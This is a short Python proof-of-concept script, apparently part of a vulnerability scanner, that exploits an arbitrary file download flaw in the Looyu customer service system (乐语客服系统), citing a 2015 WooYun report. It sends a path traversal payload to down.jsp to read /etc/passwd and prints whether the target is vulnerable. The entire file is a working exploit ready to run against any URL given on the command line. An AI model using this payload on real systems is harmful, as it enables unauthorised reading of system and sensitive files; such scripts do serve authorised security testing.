#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 乐语客服系统任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0150444
author: Lucifer
description: 乐语客服系统down.jsp文件file参数未过滤导致任意文件下载，可泄露敏感数据
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class looyu_down_filedownload:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"root:" in req.text and r"/bin/bash" in req.text:
                printGreen("[+]Success:存在乐语客服系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在looyu_down_filedownload漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = looyu_down_filedownload(sys.argv[1])
    testVuln.run()